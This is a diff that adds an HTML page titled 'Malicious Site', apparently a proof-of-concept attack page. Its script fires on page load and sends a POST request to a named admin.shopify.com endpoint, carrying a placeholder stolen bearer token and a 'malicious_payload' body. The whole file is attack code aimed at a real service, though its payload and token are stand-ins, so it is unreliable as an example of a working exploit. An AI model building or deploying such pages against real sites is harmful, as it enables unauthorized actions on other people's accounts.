@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Malicious Site</title>
+</head>
+<body>
+    <h1>Welcome to the Malicious Site!</h1>
+    <script>
+        // Crafting a request to the vulnerable endpoint
+        const url = 'https://admin.shopify.com/.well-known/dux'; // Target endpoint
+        
+        fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Authorization': 'Bearer [STOLEN_TOKEN]',  // Optional: if token can be passed
+            },
+            body: JSON.stringify({
+                data: 'malicious_payload'
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log('Response:', data);
+        })
+        .catch(error => console.log('Error:', error));
+    </script>
+</body>
+</html>
